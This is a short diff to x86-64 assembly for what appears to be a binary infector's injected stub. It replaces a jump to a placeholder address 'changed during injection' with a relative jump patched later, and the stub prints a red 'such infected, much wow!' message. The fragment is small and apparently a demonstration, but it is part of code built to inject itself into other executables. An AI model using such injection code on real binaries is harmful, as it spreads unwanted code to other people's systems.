@@ -21,9 +21,7 @@ _start:
   pop rdi
   pop rax
 
-  ;; jump to _main
-  mov rax, 0x1111111111111111   ; address changed during injection
-  jmp rax
+  jmp -0x0000                   ; changed during patching
 
 align 8
   msg     db 0x1b,'[31msuch infected, much wow!',0x1b,'[0m',0x0a,0
